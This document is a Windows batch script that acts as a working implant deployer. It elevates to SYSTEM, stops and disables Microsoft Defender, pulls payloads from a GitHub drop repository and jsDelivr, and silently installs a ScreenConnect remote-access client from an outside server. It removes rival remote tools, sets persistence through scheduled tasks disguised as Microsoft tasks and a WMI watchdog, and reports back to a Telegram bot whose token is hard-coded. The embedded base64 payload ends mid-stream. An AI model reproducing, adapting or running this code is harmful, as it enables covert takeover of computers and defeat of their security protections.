@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O26 - unharden-before-write (self-lock fix) + embed + identity + watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O26 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O26: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
  REM Strip attrs first, then VERIFY the copy is really this build - else use a fresh unique runner.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O26" "%BOOT%\own_run.cmd" >nul 2>&1
  if errorlevel 1 (
    set "RUNNER=%BOOT%\own_o26_%RANDOM%%RANDOM%.cmd"
    copy /y "%~f0" "!RUNNER!" >nul 2>&1
    echo runner_fallback_unique>>"%LOG%" 2>nul
  ) else (
    mkdir "%WD%" >nul 2>&1
    attrib -h -s -r "%SELF%" >nul 2>&1
    copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
    set "RUNNER=%SELF%"
    findstr /C:"OWN BUILD 20260802O26" "%SELF%" >nul 2>&1
    if errorlevel 1 set "RUNNER=%BOOT%\own_run.cmd"
  )
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=exterminate_then_repair_then_install>>"%LOG%"
  echo engine=cmd_detached_o26>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  echo runner=!RUNNER!>>"%LOG%"
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "PROOF=0"
      for /l %%N in (1,1,6) do (
        if exist "%BOOT%\wproof" set "PROOF=1"
        if not exist "%BOOT%\wproof" timeout /t 2 /nobreak >nul 2>&1
      )
      if "!PROOF!"=="1" (
        set "DETACH_OK=1"
        echo detach_via=schtasks_root>>"%LOG%"
      ) else (
        echo detach_a_noproof>>"%LOG%"
        type "%BOOT%\detach.task" >>"%LOG%" 2>&1
        type "%BOOT%\detach.run" >>"%LOG%" 2>&1
      )
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)
    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O26 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
echo embed_extract_done>>"%LOG%"

REM O26: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M16" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T9" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L6" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (repair-first ladder)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM service deleted but product registered: repair in place (no SC-family msiexec collision)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo primary_svc_missing_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks the SC custom action - clear it
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_!ERRORLEVEL!>>"%LOG%"
timeout /t 10 /nobreak >nul

REM post-install: product registered but service entry still missing -> repair by GUID
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O26: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=%TASK_A%>>"%LOG%"
echo identity_B=%TASK_B%>>"%LOG%"
echo identity_C=%TASK_C%>>"%LOG%"
echo identity_D=%TASK_D% mo=%MO_A%/%MO_B%>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
echo create_taskA_begin>>"%LOG%"
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O26 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O26 >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0xNgpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50aS1z
aWduYXR1cmUpLCBtdXR1YWwKcmVtICBXTUkrc2NodGFza3MgY2hhaW5zLCBNU0kgZmFsbGJhY2sg
Y2hhaW4sIHN0YXRlLmpzb24sIGRpZ2VzdCBIQi4KcmVtICBBdXRob3JpemVkIGludGVybmFsIGRl
cGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KcmVtIOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkApzZXRsb2NhbCBFbmFibGVEZWxheWVkRXhwYW5zaW9uCgpzZXQgIktFRVBfRlA9NWY2MDEw
NTc5ODUyZTUwNyIKc2V0ICJBTFRfRlA9Zjg2MWM4MTQwZDQ1MzQyNyIKc2V0ICJXRD1DOlxQcm9n
cmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSIKc2V0ICJFVEw9Qzpc
UHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLmV0bGNhY2hlIgpzZXQgIkxP
Rz0lV0QlXG93bl9tb24ubG9nIgpzZXQgIlNUQVRFPSVXRCVcb3duX21vbi5zdGF0ZSIKc2V0ICJI
QkZMQUc9JVdEJVxoYi5mbGFnIgpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwu
ZXhlIgpzZXQgIlRHPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9n
aXRodWItZHJvcC9tYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIlRH
Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90
Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcu
Z2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3Vy
ZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9XTlNFQzI9aHR0cHM6Ly9jZG4uanNkZWxp
dnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFO
RE9NJSVSQU5ET00lIgpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5j
b20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRP
TSUiCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOTElC
PWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
YWluL293bl9saWIucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJPV05MSUIyPWh0dHBzOi8v
Y2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMx
P3Q9JVJBTkRPTSUlUkFORE9NJSIKc2V0ICJNU0lfVVJMPWh0dHBzOi8vc2V2cnouY29tL1NjcmVl
bkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIgpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3LmdpdGh1
YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiCnNldCAi
TVNJX1BLRzI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9w
QG1haW4vcGtnLm1zaSIKc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNsaWVu
dFNldHVwLm1zaSIKCmlmIG5vdCBleGlzdCAiJVdEJSIgbWQgIiVXRCUiIDI+bnVsCmlmIG5vdCBl
eGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwKCnNldCAiTU9OVkVSPU0xNiIKc2V0
ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiCmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAi
ICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1lJSIKZWNoby4+PiIlTE9H
JSIKZWNobyDilIDilIAgdGljayAhRFQhIFt2ZXIgJU1PTlZFUiVdIOKUgOKUgD4+IiVMT0clIgpz
ZXQgIkNPVU5UPTAiCnNldCAiSU5TVEFMTEVEPTAiCnNldCAiUFJJTV9PSz0wIgpzZXQgIkFMVF9P
Sz0wIgpzZXQgIkZPUkVJR05fTEVGVD0wIgpzZXQgIkZPUkVJR05fTElTVD0iCnNldCAiTVNJRVhJ
VD1ub3QtcnVuIgoKcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUp
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgAppZiBub3QgZXhpc3QgIiVXRCVcaWRlbnRpdHkuY2ZnIiBpZiBleGlz
dCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biBpbml0IC1Xb3JrRGlyICIlV0QlIiA+bnVsIDI+JjEKaWYgZXhpc3QgIiVXRCVcaWRlbnRpdHku
Y2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLDIgZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVc
